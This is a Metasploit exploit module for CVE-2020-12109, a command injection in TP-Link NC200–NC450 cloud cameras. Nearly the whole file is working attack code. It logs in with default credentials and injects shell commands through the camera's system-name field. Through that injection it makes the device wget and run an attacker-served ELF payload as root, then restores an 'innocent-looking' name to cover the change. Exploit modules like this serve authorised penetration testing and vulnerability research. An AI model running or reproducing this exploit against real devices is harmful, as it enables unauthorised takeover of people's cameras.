##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'TP-Link Cloud Cameras NCXXX Bonjour Command Injection',
      'Description' => %q{
          TP-Link cloud cameras NCXXX series (NC200, NC210, NC220, NC230, 
          NC250, NC260, NC450) are vulnerable to an authenticated command
          injection. In all devices except NC210, Despite a check on the name length in 
          swSystemSetProductAliasCheck, no other checks are in place in order 
          to prevent shell metacharacters from being introduced. The system name
          would then be used in swBonjourStartHTTP as part of a shell command 
          where arbitrary commands could be injected and executed as root. NC210 devices
          cannot be exploited directly via /setsysname.cgi due to proper input
          validation. NC210 devices are still vulnerable since swBonjourStartHTTP
          did not perform any validation when reading the alias name from the
          configuration file. The configuration file can be written, and code
          execution can be achieved by combining this issue with CVE-2020-12110.
      },
      'Author'      =>
        [
          'Pietro Oliva <pietroliva[at]gmail.com>'
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          [ 'URL', 'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-12109' ],
          [ 'URL', 'https://nvd.nist.gov/vuln/detail/CVE-2020-12109' ],
          [ 'URL', 'https://seclists.org/fulldisclosure/2020/May/2' ]
        ],
      'DisclosureDate' => '29th April 2020',
      'Platform'       => %w{ linux },
      'Arch' => ARCH_MIPSLE,
      'Targets'        =>
        [
          [ 'TP-Link NC200, NC220, NC230, NC250',
            {
            'Arch' => ARCH_MIPSLE,
            'Platform' => 'linux'
            }
          ],
          [ 'TP-Link NC260, NC450',
            {
            'Arch' => ARCH_MIPSLE,
            'Platform' => 'linux'
            }
          ],
        ],
      'DefaultTarget'  => 0,
      ))

    register_options(
      [
        OptString.new('USERNAME', [ true, 'The web interface username', 'admin' ]),
        OptString.new('PASSWORD', [ true, 'The web interface password for the specified username', 'admin' ]),
        OptInt.new('TIMEOUT', [true, 'Timeout for the HTTP Server to wait for the ELF payload request', 60])
      ])
  end

  def login
    user = datastore['USERNAME']
    pass = Base64.strict_encode64(datastore['PASSWORD'])
    if target.name == 'TP-Link NC260, NC450'
      pass=Rex::Text.md5(pass)
    end
    
    print_status("Authenticating with #{user}:#{pass} ...")
    begin
      res= send_request_cgi({
        'uri' => '/login.fcgi',
        'method' => 'POST',
        'vars_post' => {
          "Username" => user,
          "Password" => pass,
        }
      })
      if res.nil? or res.code == 404
        fail_with(Failure::NoAccess, "/login.fcgi did not reply correctly. Wrong target ip?")
      end
      if res.body =~ /\"errorCode\"\:0/ and res.headers.key?('Set-Cookie') and res.body =~ /token/
        print_good("Logged-in as #{user}")
        @cookie = res.get_cookies.scan(/\s?([^, ;]+?)=([^, ;]*?)[;,]/)[0][1]
        print_good("Got cookie: #{@cookie}")
        @token = res.body.scan(/"(token)":"([^,"]*)"/)[0][1]
        print_good("Got token: #{@token}")
      else
        fail_with(Failure::NoAccess, "Login failed with #{user}:#{pass}")
      end
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "Connection failed")
    end
  end

  def enableBonjour()
    begin
      res = send_request_cgi({
        'uri'    => '/setbonjoursetting.fcgi',
        'method' => 'POST',
        'encode_params' => false,
        'cookie' => "sess=#{@cookie}",
        'vars_post' => {
          "bonjourState" => "1",
          "token" => "#{@token}"
        }
      })
      return res
    rescue ::Rex::ConnectionError
      vprint_error("Failed connection to the web server at #{rhost}:#{rport}")
      return nil
    end
  end

  def execute(cmd)
    setSysName("$(#{cmd})")
    enableBonjour()
  end

  def setSysName(cmd)
    begin
      res = send_request_cgi({
        'uri'    => '/setsysname.fcgi',
        'method' => 'POST',
        'encode_params' => false,
        'cookie' => "sess=#{@cookie}",
        'vars_post' => {
          "sysname" => "#{cmd}",
          "token" => "#{@token}"
        }
      })
      return res
    rescue ::Rex::ConnectionError
      vprint_error("Failed connection to the web server at #{rhost}:#{rport}")
      return nil
    end
  end

  def startWebServer
    oldSSL = datastore['SSL']
    datastore['SSL'] = false
    lhost=datastore['LHOST']
    srv_port = datastore['SRVPORT']

    print_status("Starting web server on #{lhost}:#{srv_port} ...")
    start_service({'Uri' => {
      'Proc' => Proc.new { |cli, req|
        on_request_uri(cli, req)
      },
      'Path' => '/'
    }})

    datastore['SSL'] = oldSSL
  end

  def uploadAndExecute
    srv_port = datastore['SRVPORT']
    lhost=datastore['LHOST']

    print_status("Triggering payload download from http://#{lhost}:#{srv_port}")
    filename = rand_text_alpha_lower(8)

    cmd = "wget http://#{lhost}:#{srv_port}/ -O /tmp/#{filename}"

    res = execute(cmd)
    if (!res)
      fail_with(Failure::Unknown, "Payload upload failed")
    end

    wait_payload_delivery

    cmd = "f=/tmp/#{filename}; chmod %2bx $f; $f %26 rm $f"
    print_status("Executing #{filename}")
    res = execute(cmd)
    if (!res)
      fail_with(Failure::Unknown, "Unable to execute payload")
    end

  end

  def exploit
    @payload = generate_payload_exe
    @elf_delivered = false

    if target.name == 'TP-Link NC260, NC450'
      datastore['SSL'] = true
    else
      datastore['SSL'] = false
    end

    login()             # Get cookie and csrf token
    startWebServer()    # Start payload delivery web server
    uploadAndExecute()  # Trigger payload download and execution via command injection
    setSysName("NC200") # Set back an innocent-looking device name

  end

  # Handle payload delivery
  def on_request_uri(cli, request)
    if (not @payload)
      return # payload is not ready yet
    end

    if (not @elf_delivered)
      print_good("A request just came in...")
      print_status("Sending the payload...")
    end

    send_response(cli, @payload)
    @elf_delivered = true
  end

  def wait_payload_delivery
    while ( (datastore['TIMEOUT'] -= 1) > 0 )
      if (@elf_delivered)
        return
      end
      sleep(1)
    end
    
    fail_with(Failure::Unknown, "No requests received within timeout. Connectivity issues?")
  end
end
